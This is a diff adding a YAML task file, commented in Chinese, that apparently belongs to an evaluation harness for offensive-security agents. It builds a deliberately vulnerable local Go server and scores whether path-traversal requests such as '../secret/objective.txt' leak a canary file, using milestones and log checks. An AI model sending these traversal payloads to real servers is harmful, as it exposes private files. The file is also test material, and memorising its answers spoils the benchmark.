@@ -1,0 +1,110 @@
+# layer=2：真实形态的「冻结版本 + outcome 判定」。
+# 靶仍是夹具（自检用），但判分口径与真实 CVE 题完全一致：
+#   - freeze.kind=manifest：靶源码逐文件 SHA256 记进 freeze.lock，drift 即拒绝运行；
+#   - scoring.mode=outcome：只有 objective 的**全部** probe 命中才记 achieved；
+#   - 里程碑只用于解释「失败停在哪一段」，不参与 verdict。
+#
+# 两条 objective 判据刻意走两个独立通道：
+#   p-leak    看 HTTP 响应里有没有 webroot 之外的目标文件内容；
+#   p-hostlog 看靶进程自己写的审计日志有没有记录「打开过那个绝对路径」。
+# 只看响应，可能被一个精心构造的假页面骗过；两个通道同时成立，才叫后果达成。
+task_id: l2-pt-escape
+name: 冻结版本：路径穿越读出 webroot 之外的机密文件（outcome 判定）
+layer: 2
+notes: |
+  这是「判后果」的最小完整例子。靶里没有 flag，只有一个运行期铸造的哨兵文件：
+  {{target_data}}/secret/objective.txt，内容每次运行都不同。
+  判定要求两件事同时成立：
+    1) 这个哨兵的内容出现在 HTTP 响应里（数据真的外泄了）；
+    2) 靶进程的审计日志记下了它打开的绝对路径（进程真的读了 webroot 外的 inode）。
+  两件事都不是「拿到某个约定字符串」就能满足的——它们只能由穿越行为造成。
+
+target:
+  kind: exec
+  build: ["go", "build", "-o", "{{bin}}", "./eval/fixtures/pathtraversal"]
+  cmd: ["{{bin}}", "-addr", "127.0.0.1:{{port}}", "-data", "{{target_data}}", "-mode", "vuln"]
+  ready:
+    kind: tcp_dial
+    addr: "127.0.0.1:{{port}}"
+    timeout_ms: 30000
+
+freeze:
+  kind: manifest
+  ref: fixture-pathtraversal-v1
+  artifacts:
+    - path: eval/fixtures/pathtraversal/main.go
+
+canaries:
+  - id: notice
+    kind: file
+    path: "{{target_data}}/outside/notice.txt"
+    prefix: "OUTSIDE-"
+  - id: objective
+    kind: file
+    path: "{{target_data}}/secret/objective.txt"
+    prefix: "OBJECTIVE-"
+
+attack:
+  - id: a1-baseline
+    kind: http
+    url: "{{target_base}}/download?name=index.html"
+    note: 基线：先证明接口能正常读 webroot 内文件，避免把 500 页里的巧合当成功
+  - id: a2-escape
+    kind: http
+    url: "{{target_base}}/download?name=../outside/notice.txt"
+  - id: a3-objective
+    kind: http
+    url: "{{target_base}}/download?name=../secret/objective.txt"
+
+objective:
+  description: webroot 之外的目标文件内容出现在 HTTP 响应里，且靶进程审计日志记录了它打开了该绝对路径
+  mode: all
+  probes:
+    - id: p-leak
+      kind: http_response
+      url: "{{target_base}}/download?name=../secret/objective.txt"
+      expect_status: [200]
+      expect_contains: ["{{canary:objective}}"]
+    - id: p-hostlog
+      kind: file_read
+      path: "{{target_data}}/access.log"
+      expect_contains: ["SERVED {{canary_path:objective}}"]
+
+milestones:
+  - id: m1-baseline
+    name: 基线：接口能读到 webroot 内文件
+    points: 20
+    probe:
+      id: p-baseline
+      kind: http_response
+      url: "{{target_base}}/download?name=index.html"
+      expect_status: [200]
+      expect_contains: ["LANCE-EVAL-HOME"]
+  - id: m2-escape
+    name: 穿越出 webroot，读到 outside 文件
+    points: 30
+    requires: [m1-baseline]
+    probe:
+      id: p-escape
+      kind: http_response
+      url: "{{target_base}}/download?name=../outside/notice.txt"
+      expect_status: [200]
+      expect_contains: ["{{canary:notice}}"]
+  - id: m3-objective
+    name: 读到目标机密文件
+    points: 50
+    requires: [m2-escape]
+    probe:
+      id: p-objective
+      kind: http_response
+      url: "{{target_base}}/download?name=../secret/objective.txt"
+      expect_status: [200]
+      expect_contains: ["{{canary:objective}}"]
+
+scoring:
+  mode: outcome
+  points_mode: additive
+
+calibration:
+  # 夹具题自检用：judge 必须判 true。真实 CVE 题不写这一项。
+  expect_achieved: true
